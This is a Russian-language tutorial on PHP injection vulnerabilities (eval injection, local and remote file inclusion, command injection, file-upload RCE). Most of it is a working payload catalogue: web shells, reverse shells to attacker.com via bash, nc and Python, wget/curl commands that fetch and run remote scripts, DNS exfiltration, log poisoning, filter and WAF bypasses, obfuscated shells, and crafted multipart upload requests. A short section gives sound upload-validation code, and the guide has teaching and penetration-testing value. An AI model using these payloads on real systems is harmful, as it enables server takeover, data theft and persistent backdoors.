
## PHP Injection - Уязвимости в PHP

## Содержание

1. [Что такое PHP](#что-такое-php)
2. [Что такое PHP инъекция](#что-такое-php-инъекция)
3. [Типы PHP инъекций](#типы-php-инъекций)
   - [1. PHP Code Injection (eval, assert, create_function)](#1-php-code-injection-eval-assert-create_function)
   - [2. File Inclusion (include, require)](#2-file-inclusion-include-require)
   - [3. Command Injection (system, exec, shell_exec)](#3-command-injection-system-exec-shell_exec)
   - [4. File Upload + RCE (комбинированная атака)](#4-file-upload--rce-комбинированная-атака)
4. [Методы эксплуатации](#методы-эксплуатации)
   - [RFI (Remote File Inclusion)](#rfi-remote-file-inclusion)
   - [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
   - [PHP Wrappers](#php-wrappers)
5. [Примеры payload'ов](#примеры-payloadов)

---

### Что такое PHP

**PHP (PHP: Hypertext Preprocessor)** — это популярный скриптовый язык программирования с открытым исходным кодом, который в основном используется для веб-разработки, встраивается в HTML и выполняется на стороне сервера. 

Язык PHP отличается от языка JavaScript, который обрабатывается на клиентской стороне, тем, что PHP-скрипты **выполняются на сервере**, и генерируют HTML-разметку, которая затем посылается клиенту. Клиент получит результаты запуска этого скрипта, но не будет знать, какой базовый код сгенерировал результаты. Веб-сервер настраивается даже так, чтобы обычные HTML-файлы обрабатывались процессором PHP, и тогда клиенты даже не смогут узнать, получают ли они обычный HTML-файл или результат выполнения скрипта.

Пример программирования на языке PHP:
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Пример</title>
    </head>
    <body>

        <?php
        echo "Привет, я — PHP-скрипт!";
        ?>

    </body>
</html>
```

Вместо рутинного вывода HTML-кода командами языка (как в языках C или Perl), PHP-страницы содержат HTML-разметку со встроенным кодом, который проделывает полезную работу (в примере — выводит текст «Привет, я — PHP-скрипт!»). PHP-код отделяется начальным и конечным тегами ```<?php и ?>``` — инструкциями начала и завершения обработки кода, которые разрешают входить в PHP-режим и выходить из него. При этом, вставок с ```php``` кодом может быть несколько в одном документе.

---

### Что такое PHP инъекция

**PHP Code Injection** - уязвимость ввода вредоносного кода на языке PHP, который исполняется на стороне сервера. Данная уязвимость возникает, когда приложение включает управляемые пользователем данные (например, через параметры), которые динамически оценивается интерпретатором кода.

Пример PHP-инъекции:
```php
<?php
// Уязвимый код
$func = $_GET['func'];
eval($func . "();");
?>
```
Если пользователь откроет:
```url
https://example.com/page.php?func=phpinfo
```

То сервер выполнит:
```php
eval("phpinfo();");
```

И покажет системную информацию пользователю, так как этот код выполнит PHP на стороне сервера и вернет в браузер пользователю. А если злоумышленник отправит:
```url
https://example.com/page.php?func=system('ls');
```

Тогда PHP выполнит команду ```ls``` на сервере — и это уже удалённое выполнение кода (RCE).

### Типы PHP инъекций:

#### 1. **PHP Code Injection (eval, assert, create_function)**

**Суть уязвимости:**

PHP предоставляет функции для динамического выполнения кода из строк (`eval()`, `assert()`, `create_function()`). Когда пользовательский ввод попадает в аргументы этих функций без валидации, атакующий получает возможность выполнить произвольный PHP код на сервере с правами веб-сервера. Это прямой путь к RCE (Remote Code Execution).

**Типичные сценарии возникновения:**
- Динамическое вычисление выражений (калькуляторы, формулы)
- Системы фильтрации с динамической логикой (поиск, сортировка, выборка)
- Кастомные template engines без должного escaping
- Динамическая обработка пользовательских "правил" или "условий"
- Debug/diagnostic endpoints оставленные в production
- Устаревшие плагины и модули CMS с eval() в коде

**Техническая суть:** Функции `eval()`, `assert()` (PHP < 7.2) и `create_function()` интерпретируют строковые аргументы как исполняемый PHP код. Контроль над этими аргументами = контроль над выполнением кода.

**Опасные функции:**
- `eval($code)` - выполняет код напрямую
- `assert($assertion)` - в PHP < 7.2 может исполнять код
- `create_function()` - создаёт анонимные функции (устарела с PHP 7.2)
- `preg_replace('/pattern/e', ...)` - модификатор `/e` позволял исполнять код (удалён в PHP 7.0)

**Уязвимый код:**
```php
// Пример 1: Динамическая обработка контента
$page = $_GET['page'];
eval("\$content = get_page_content('$page');"); // Намерение: загрузить контент
echo $content;

// Пример 2: Кастомный шаблонизатор
$tpl_code = $_POST['template'];
eval("?>" . $tpl_code); // Выполнение кода из шаблона

// Пример 3: Debug endpoint (забыли удалить)
$debug = $_GET['debug'];
assert($debug); // В PHP < 7.2 исполняет код
```

**Реальная эксплуатация:**

1. **Простое выполнение команд:**
```bash
?page=home');system('id');//
Выполнится: eval("$content = get_page_content('home');system('id');//');");
Результат: uid=33(www-data) gid=33(www-data)
```

2. **Загрузка веб-шелла:**
```bash
?page=x');file_put_contents('shell.php','<?php system($_GET[cmd]);?>');//
Создастся файл shell.php, затем доступ: shell.php?cmd=whoami
```

3. **Обход через конкатенацию (если есть фильтрация):**
```php
// Если валидируют слово "system"
?page=x');$a='sys'.'tem';$a('whoami');//
?page=x');${'_GET'}['c'];//&c=system('id')
```

4. **Эксплуатация через assert() в debug endpoints:**
```bash
?debug=system('cat /etc/passwd')
Выполнится: assert("system('cat /etc/passwd')");
В PHP < 7.2 это выполнит команду
```

**Практическая опасность:**
- RCE (Remote Code Execution) - полный контроль над сервером
- Чтение конфигурационных файлов с паролями БД
- Установка backdoor'ов для постоянного доступа
- Кража данных пользователей

---

#### 2. **File Inclusion (include, require)**

**Суть уязвимости:**

PHP использует функции `include()`, `require()`, `include_once()`, `require_once()` для модульной организации кода. Когда путь к подключаемому файлу формируется с использованием пользовательского ввода, возникает возможность включить произвольный файл - как локальный (LFI - Local File Inclusion), так и удаленный (RFI - Remote File Inclusion).

LFI позволяет читать файлы на сервере (исходники, конфиги, системные файлы). RFI дает возможность выполнить код с внешнего источника. Обе уязвимости часто приводят к RCE через техники типа log poisoning или использование PHP wrappers.

**Типичные сценарии возникновения:**
- Мультиязычность через динамическую загрузку языковых файлов (`?lang=en`)
- Роутинг через параметры (`?page=home`, `?section=about`)
- Системы шаблонов с динамической загрузкой (`?template=default`)
- Модульная архитектура с пользовательским выбором модулей
- Устаревшие CMS где paths не валидируются

**Техническая суть:** Функции include/require выполняют PHP код из указанного файла. Контроль над путем = возможность выполнить произвольный код или прочитать sensitive данные.

**Уязвимый код:**
```php
// Типичный пример с мультиязычностью
$lang = $_GET['lang'];
include("languages/" . $lang . ".php"); // Намерение: languages/en.php

// Пример с шаблонами страниц
$page = $_GET['page'] ?? 'home';
require($page . '.php'); // Намерение: home.php
```

**Реальная эксплуатация:**

**A) LFI (Local File Inclusion) - чтение локальных файлов:**

1. **Directory Traversal - чтение системных файлов:**
```bash
?lang=../../../../etc/passwd
Выполнится: include("languages/../../../../etc/passwd.php")
Прочитает /etc/passwd (даже с .php в конце, если файл текстовый)
```

2. **Null Byte Injection (PHP < 5.3.4):**
```bash
?lang=../../../../etc/passwd%00
%00 обрезает строку, игнорируя .php после него
```

3. **Использование PHP Wrappers для обхода:**
```bash
?page=php://filter/read=convert.base64-encode/resource=index
Получим base64 исходного кода index.php (обходит парсинг PHP)

?page=php://filter/resource=/etc/passwd
Прямое чтение файлов без base64

?page=php://input
+ отправить POST с PHP кодом: <?php system('whoami'); ?>
Код из POST будет выполнен!
```

4. **Log Poisoning - внедрение через логи:**
```bash
# 1. Отравляем User-Agent в access.log:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Подключаем лог файл:
?page=../../../../var/log/apache2/access.log&cmd=id
```

**B) RFI (Remote File Inclusion) - подключение внешних файлов:**

Требует настройки: `allow_url_include = On` (по умолчанию выключено)

```bash
?page=http://attacker.com/shell.txt
Загрузит и выполнит код с внешнего сервера

?page=ftp://attacker.com/backdoor.txt
Можно использовать FTP протокол

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
Внедрение через data:// wrapper (base64 декодируется в PHP код)
```

**Практические техники обхода фильтров:**
```php
// Если фильтруют '../':
?page=....//....//etc/passwd (двойное кодирование)
?page=..././..././etc/passwd

// Если фильтруют '/etc/passwd':
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

// Обход расширения .php через zip wrapper:
# Создаём shell.php, упаковываем в shell.zip, загружаем
?page=zip://uploads/shell.zip%23shell
```

**Что можно прочитать:**
- `/etc/passwd` - список пользователей
- `/etc/shadow` - хеши паролей (если права позволяют)
- `/var/www/html/config.php` - конфиги с паролями БД
- `/proc/self/environ` - переменные окружения
- `~/.bash_history` - история команд
- `/var/log/apache2/access.log` - логи для poisoning

**Практическая опасность:**
- Чтение исходного кода приложения и конфигов
- Получение паролей баз данных
- RCE через log poisoning или php://input
- Чтение файлов других пользователей сервера

---

#### 3. **Command Injection (system, exec, shell_exec)**

**Суть уязвимости:**

PHP предоставляет функции для выполнения системных команд (`system()`, `exec()`, `shell_exec()`, `passthru()`, обратные кавычки). Когда пользовательские данные попадают в аргументы этих функций без должной санитизации, атакующий может использовать shell метасимволы (`;`, `&&`, `||`, `|`, ``` и т.д.) для выполнения произвольных команд на уровне ОС.

Это критическая уязвимость, дающая прямой доступ к shell с правами веб-сервера (обычно `www-data` или `apache`). Атакующий получает возможность читать файлы системы, модифицировать данные, устанавливать backdoors, выполнять lateral movement.

**Типичные сценарии возникновения:**
- Network utilities (ping, traceroute, nslookup, whois)
- Обработка media файлов (ImageMagick, FFmpeg через exec)
- Backup системы (tar, zip, mysqldump)
- Git операции на сервере
- Интеграция с внешними утилитами (wkhtmltopdf, pandoc)
- Любой код где PHP вызывает внешние программы с пользовательскими параметрами

**Техническая суть:** Shell интерпретатор обрабатывает метасимволы для управления выполнением команд. Инъекция этих символов позволяет выполнять дополнительные команды beyond intended logic.

**Опасные функции:**
- `system($cmd)` - выполняет команду, выводит результат напрямую
- `exec($cmd, $output)` - выполняет, возвращает последнюю строку
- `shell_exec($cmd)` - возвращает полный вывод
- `passthru($cmd)` - выполняет и выводит "сырой" результат
- `` `$cmd` `` - обратные кавычки (аналог shell_exec)
- `popen($cmd, 'r')` - открывает процесс
- `proc_open($cmd, ...)` - расширенное выполнение

**Уязвимый код:**
```php
// Пример 1: Ping утилита
$ip = $_GET['ip'];
system("ping -c 4 $ip"); // Намерение: ping -c 4 8.8.8.8

// Пример 2: Конвертация изображений
$filename = $_POST['file'];
exec("convert uploads/$filename output.png");

// Пример 3: Архиватор
$dir = $_GET['dir'];
$output = shell_exec("tar -czf backup.tar.gz $dir");
```

**Реальная эксплуатация:**

1. **Базовое цепочное выполнение:**
```bash
?ip=8.8.8.8; whoami
Выполнится: ping -c 4 8.8.8.8; whoami
          : сначала ping, потом whoami

?ip=8.8.8.8 && cat /etc/passwd
&&: выполнит вторую команду только если первая успешна

?ip=8.8.8.8 || cat /etc/passwd
||: выполнит вторую команду если первая упала

?ip=8.8.8.8 | cat /etc/passwd
|: pipe - передаёт вывод первой команды во вторую
```

2. **Подстановка команд:**
```bash
?ip=`whoami`
Сначала выполнится whoami, результат подставится: ping -c 4 www-data

?ip=$(cat /etc/passwd)
Аналогично с $() синтаксисом
```

3. **Комплексные атаки:**
```bash
# Reverse shell
?ip=8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Или через nc
?ip=8.8.8.8; nc -e /bin/bash attacker.com 4444

# Или через Python (если установлен)
?ip=8.8.8.8; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

4. **Загрузка и выполнение скриптов:**
```bash
?ip=8.8.8.8; wget http://attacker.com/shell.sh -O /tmp/s.sh; bash /tmp/s.sh

?ip=8.8.8.8; curl http://attacker.com/backdoor.php > shell.php
```

5. **Обход фильтров:**
```bash
# Если фильтруют пробелы:
?ip=8.8.8.8;cat${IFS}/etc/passwd
?ip=8.8.8.8;cat</etc/passwd

# Если фильтруют 'cat':
?ip=8.8.8.8;c'a't /etc/passwd
?ip=8.8.8.8;c\at /etc/passwd
?ip=8.8.8.8;ca''t /etc/passwd
?ip=8.8.8.8;${PATH:0:1}bin${PATH:0:1}cat /etc/passwd

# Используя переменные:
?ip=8.8.8.8;a=c;b=at;$a$b /etc/passwd

# Base64 encoding:
?ip=8.8.8.8;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

6. **Тайм-слепые инъекции (если нет вывода):**
```bash
?ip=8.8.8.8; sleep 10
Если страница грузится 10 секунд - инъекция работает

?ip=8.8.8.8; ping -c 10 your-server.com
Проверяем получение ping'ов на своём сервере

# Эксфильтрация данных через DNS:
?ip=8.8.8.8; nslookup $(whoami).attacker.com
Результат whoami придёт в DNS запросе
```

**Реальные сценарии:**
```php
// Scenario 1: Уязвимость в ImageMagick wrapper
$file = $_FILES['image']['tmp_name'];
system("convert $file -resize 800x600 output.jpg");
// Эксплуатация: загрузить файл с именем "a.jpg; wget backdoor"

// Scenario 2: Backup system
$db = $_POST['database'];
exec("mysqldump -u root -p'pass' $db > backup.sql");
// Эксплуатация: database=mydb; cat /etc/passwd > /var/www/html/out.txt
```

**Практическая опасность:**
- Полный контроль над сервером на уровне ОС
- Установка руткитов и майнеров
- Латеральное движение по сети (атака других серверов)
- Кража SSL сертификатов и приватных ключей
- Модификация системы для скрытия присутствия

---

#### 4. **File Upload + RCE (комбинированная атака)**

**Важно:** Это **НЕ** чистая PHP Injection, а комбинация уязвимостей. File Upload сам по себе - отдельная категория (Unrestricted File Upload), но в связке с PHP часто приводит к RCE.

**Суть уязвимости:**

Механизм загрузки файлов не валидирует должным образом тип, содержимое или расширение файлов. Атакующий загружает файл с PHP кодом на сервер, затем обращается к нему через URL или комбинирует с LFI. Сервер интерпретирует загруженный файл как PHP код и выполняет его.

**Типичные сценарии возникновения:**
- Аватары пользователей, галереи изображений
- Системы загрузки документов (резюме, отчеты)
- Импорт данных (CSV, XML обработка)
- Backup/restore функциональность
- Любая загрузка файлов без должной валидации

**Техническая суть:** Загрузка PHP файла → доступ к нему через веб-сервер → Apache/Nginx интерпретирует .php → код выполняется.

**Уязвимый код:**
```php
// Пример 1: Загрузка без проверок
$uploadDir = 'uploads/';
$uploadFile = $uploadDir . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
// ОПАСНО: любой файл, включая .php!

// Пример 2: Проверка только MIME type (легко обойти)
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'avatars/' . $_FILES['file']['name']);
}
// ОПАСНО: MIME type контролируется клиентом!

// Пример 3: Слабая валидация расширения
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, ['jpg', 'png', 'gif'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'images/' . $_FILES['file']['name']);
}
// Может быть обойдено через .php.jpg или case-sensitivity
```

**Реальная эксплуатация:**

**1. Прямая загрузка PHP shell:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
Если нет валидации, файл загружается напрямую.
Доступ: http://target.com/uploads/shell.php?cmd=whoami

**2. Обход через двойное расширение:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg" //<= Добавляем двойное расширение
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
Некоторые серверы обрабатывают первое расширение (.php).
Доступ: http://target.com/uploads/shell.php.jpg?cmd=id

**3. Обход через null byte (PHP < 5.3.4):**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg" //<= Добавляем null byte
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
PHP обрезает имя файла после null byte (%00), сохраняется как shell.php.
Доступ: http://target.com/uploads/shell.php?cmd=whoami

**4. Обход через Content-Type manipulation:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <= Подделываем MIME type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**5. Обход через case-sensitivity (Windows серверы):**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.PhP"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
Windows не различает регистр расширений: .php = .PhP = .pHp
Доступ: http://target.com/uploads/shell.PhP?cmd=whoami

**6. Обход через точку в конце:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php."
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
ОС автоматически удаляет точку в конце имени файла, сохраняется как shell.php
Работает на Windows и многих конфигурациях Linux.
Доступ: http://target.com/uploads/shell.php?cmd=id

**7. Комбинация File Upload + LFI:**
```php
// Загружаем файл с PHP кодом под безопасным расширением
// Имя файла: backdoor.txt
// Содержимое: <?php system($_GET['c']); ?>

// Затем используем LFI:
?page=uploads/backdoor.txt&c=whoami
// include() выполнит PHP код из .txt файла!
```

**8. Phar + File Upload (advanced):**
```bash
# Создаём .phar с вредоносным объектом
# Загружаем как .jpg (обходим фильтры)
# Затем используем phar wrapper:
?file=phar://uploads/image.jpg/test
# Десериализация → RCE
```

**9. Polyglot файлы (PHP + image):**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.gif"
Content-Type: image/gif

GIF89a    <= Валидный GIF header
<?php system($_GET['c']); ?>
------WebKitFormBoundary--
```
Файл проходит проверку getimagesize(), но PHP интерпретирует код.
Доступ: /uploads/avatar.gif?c=whoami

**10. .htaccess upload для изменения конфигурации:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .jpg
------WebKitFormBoundary--
```
Теперь все .jpg в uploads/ обрабатываются как PHP!
Затем загружаем shell.jpg с PHP кодом → выполняется.

**11. Web shell обфускация:**
```text
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: application/x-php

<?php
$a = str_rot13('flfgrz');  // system
$b = $_GET[base64_decode('Y21k')];  // cmd
$a($b);
?>
------WebKitFormBoundary--
```
Обход сканеров и WAF через обфускацию.
Доступ: /uploads/image.php?cmd=whoami

**Техники валидации (что проверять):**

**Слабые методы (легко обойти):**
- ❌ MIME type (`$_FILES['file']['type']`) - контролируется клиентом
- ❌ Расширение без whitelist - легко обойти через .php5, .phtml
- ❌ Проверка только первых байтов - polyglot файлы

**Правильные методы:**
```php
// 1. Whitelist расширений + переименование
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die('Invalid file type');
}
$newName = bin2hex(random_bytes(16)) . '.' . $ext;  // Случайное имя
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $newName);

// 2. Проверка содержимого через getimagesize()
$check = getimagesize($_FILES['file']['tmp_name']);
if ($check === false) {
    die('Not a valid image');
}

// 3. Изоляция uploads директории
// Запретить выполнение PHP в uploads/ через .htaccess:
php_flag engine off

// 4. Хранение вне web root
move_uploaded_file($_FILES['file']['tmp_name'], '/var/data/uploads/' . $newName);
// Доступ только через специальный скрипт, который отдаёт файл
```

**Практическая опасность:**
- Полный RCE через загрузку веб-шелла
- Backdoor с постоянным доступом
- Defacement сайта
- Загрузка malware для атак на пользователей
- Использование сервера для phishing/spam
- Хранение нелегального контента на сервере жертвы

**Индикаторы уязвимости при тестировании:**
- Загруженный .php файл доступен по прямому URL
- Можно загрузить файл с произвольным расширением
- Нет рандомизации имён файлов
- Uploads директория имеет execute права
- .htaccess можно загрузить и он обрабатывается

---

### Методы эксплуатации:

#### **RFI (Remote File Inclusion)**
- Включение файлов с удаленных серверов
- Требует `allow_url_include = On`
```bash
?page=http://evil.com/shell.txt
```

#### **LFI (Local File Inclusion)**
- Включение локальных файлов
- Обход с помощью `../` (Directory Traversal)
```bash
?page=../../../etc/passwd
?page=php://filter/read=convert.base64-encode/resource=index.php
```

#### **PHP Wrappers**
- `php://input` - чтение POST данных
- `php://filter` - фильтрация потоков
- `data://` - встроенные данные
- `expect://` - выполнение команд

### Примеры payload'ов:

```php
// Базовые команды
system('id');
exec('whoami');
shell_exec('ls -la');

// Чтение файлов
file_get_contents('/etc/passwd');
readfile('/etc/hostname');

// PHP код
eval('phpinfo();');
assert('system("id")');

// Файловые операции
file_put_contents('shell.php', '<?php system($_GET[cmd]); ?>');
```
